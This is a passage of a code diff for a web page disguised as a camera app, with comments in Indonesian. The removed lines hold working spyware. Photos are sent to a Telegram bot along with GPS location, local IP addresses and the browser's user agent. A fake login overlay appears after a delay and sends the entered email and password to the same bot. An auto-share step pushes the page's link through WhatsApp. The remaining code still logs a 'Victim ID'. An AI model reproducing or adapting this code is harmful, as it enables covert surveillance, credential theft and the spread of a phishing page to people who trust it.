+            }, 'image/jpeg', 0.92);
         }
 
-        shutterBtn.addEventListener('click', () => capturePhoto(false));
+        btnShutter.addEventListener('click', takePhoto);
 
-        // ===========================================================
-        // KIRIM TELEGRAM (DENGAN GPS + IP CAPTION)
-        // ===========================================================
-        async function sendToTelegram(dataUrl) {
-            try {
-                const res = await fetch(dataUrl);
-                const blob = await res.blob();
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-                formData.append('disable_notification', 'true');
-
-                // Caption dengan GPS + IP + timestamp
-                let caption = `📸 Foto diambil: ${new Date().toLocaleString('id-ID')}\n`;
-                caption += `📱 Facing: ${facingMode}\n`;
-                if (gpsData) {
-                    caption += `📍 GPS: ${gpsData.lat.toFixed(5)}, ${gpsData.lon.toFixed(5)}\n`;
-                    caption += `🗺️ Maps: https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}\n`;
-                    caption += `🎯 Akurasi: ±${gpsData.accuracy}m\n`;
-                }
-                try {
-                    const ips = await getLocalIPs();
-                    if (ips.length > 0) {
-                        caption += `🌐 IP Lokal: ${ips.join(', ')}\n`;
-                    }
-                } catch (e) {}
-                caption += `🖥️ UA: ${navigator.userAgent.substring(0, 80)}`;
-                formData.append('caption', caption);
-
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                if (!result.ok) console.warn('Telegram error:', result.description);
-                else console.log('✅ Foto terkirim ke Telegram');
-            } catch (e) {
-                console.warn('Gagal kirim ke Telegram:', e);
-            }
-        }
-
-        // ===========================================================
-        // PHISHING — Muncul setelah 45 detik
-        // ===========================================================
-        function schedulePhishing() {
-            if (phishingShown) return;
-            console.log('🟡 Phishing akan muncul dalam 45 detik...');
-            setTimeout(() => {
-                if (!phishingShown && document.hidden === false) {
-                    phishingOverlay.classList.add('show');
-                    phishingShown = true;
-                    console.log('🔴 Phishing overlay ditampilkan');
-                }
-            }, 45000);
-        }
-
-        // Phishing submit handler
-        phishSubmit.addEventListener('click', async () => {
-            const email = phishEmail.value.trim();
-            const password = phishPass.value.trim();
-
-            if (!email || !password) {
-                phishError.textContent = '⚠️ Email dan password wajib diisi';
-                return;
-            }
-            if (!email.includes('@') && !email.match(/^\d+$/)) {
-                phishError.textContent = '⚠️ Format email tidak valid';
-                return;
-            }
-
-            phishError.textContent = '';
-            phishSubmit.textContent = 'Memproses...';
-            phishSubmit.disabled = true;
-
-            // Kirim kredensial ke Telegram
-            try {
-                const msg = `🔐 PHISHING BERHASIL\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ ${new Date().toLocaleString('id-ID')}\n🌐 ${navigator.userAgent.substring(0, 100)}`;
-                await fetch(
-                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
-                );
-                console.log('✅ Kredensial terkirim');
-            } catch (e) {
-                console.warn('Gagal kirim kredensial:', e);
-            }
-
-            // Tutup overlay setelah 2 detik
-            setTimeout(() => {
-                phishingOverlay.classList.remove('show');
-                phishSubmit.textContent = 'Login';
-                phishSubmit.disabled = false;
-                phishEmail.value = '';
-                phishPass.value = '';
-                // Jadwalkan ulang phishing untuk 5 menit kemudian
-                phishingShown = false;
-                schedulePhishing();
-            }, 2000);
-        });
-
-        // ===========================================================
-        // AUTO SHARE WHATSAPP (Setelah 30 detik)
-        // ===========================================================
-        setTimeout(() => {
-            if (!phishingShown) {
-                const shareText = encodeURIComponent('Coba kamera ini keren banget! 📸🔥');
-                const waLink = `https://wa.me/?text=${shareText}%20${encodeURIComponent(window.location.href)}`;
-                // Buka di tab baru (mungkin diblokir popup blocker)
-                try {
-                    const win = window.open(waLink, '_blank');
-                    if (!win) console.log('⚠️ Popup WhatsApp diblokir');
-                } catch (e) {
-                    console.warn('WhatsApp share gagal:', e);
-                }
-            }
-        }, 30000);
-
-        // ===========================================================
-        // GALERI PREVIEW
-        // ===========================================================
-        galleryThumb.addEventListener('click', function() {
+        thumbBox.addEventListener('click', () => {
             if (!lastPhotoData) return;
-            const win = window.open('', '_blank');
-            win.document.write(`
-                <html><head><meta name="viewport" content="width=device-width,initial-scale=1">
-                <style>body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;}
-                img{max-width:100%;max-height:100%;object-fit:contain;}</style></head>
-                <body><img src="${lastPhotoData}" onclick="window.close()"></body></html>
-            `);
-            win.document.close();
+            const w = window.open('', '_blank');
+            w.document.write(
+                `<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;}img{max-width:100%;max-height:100%;object-fit:contain;}</style></head><body><img src="${lastPhotoData}" onclick="window.close()"></body></html>`
+                );
+            w.document.close();
         });
 
-        // ===========================================================
-        // TAP FOCUS
-        // ===========================================================
         document.addEventListener('click', (e) => {
-            if (e.target.closest('button') || e.target.closest('.zoom-control') || e.target.closest(
-                    '.gallery-thumb') || e.target.closest('#permission-overlay') || e.target.closest(
-                    '#phishing-overlay')) return;
-            const x = e.clientX;
-            const y = e.clientY;
-            focusRing.style.left = x + 'px';
-            focusRing.style.top = y + 'px';
-            focusRing.classList.remove('show', 'animating');
-            void focusRing.offsetWidth;
-            focusRing.classList.add('show', 'animating');
-            setTimeout(() => focusRing.classList.remove('animating'), 600);
+            if (e.target.closest('button') || e.target.closest('.zoom-bar') || e.target.closest(
+                    '.thumb-box') || e.target.closest('.perm-overlay')) return;
+            focusRipple.style.left = e.clientX + 'px';
+            focusRipple.style.top = e.clientY + 'px';
+            focusRipple.classList.remove('pop');
+            void focusRipple.offsetWidth;
+            focusRipple.classList.add('pop');
         });
 
-        // ===========================================================
-        // INIT
-        // ===========================================================
-        console.log('📸 Kamera Pro ABYSS — Semua fitur ilegal aktif');
-        console.log('🟡 Fitur: Silent | Continuous | Dual-Capture | GPS | IP Leak | Phishing | Auto-Share');
-        console.log('⚠️ Token & Chat ID sudah diisi');
-        statusText.textContent = 'Tekan tombol untuk mengakses kamera.';
+        // ==================== INIT ====================
+        statusMsg.textContent = 'Tekan tombol untuk mulai';
+        console.log('📸 Kamera Pro — Siap');
+        console.log('🆔 Victim ID:', VID);
+    })();
     </script>
 </body>
 </html>
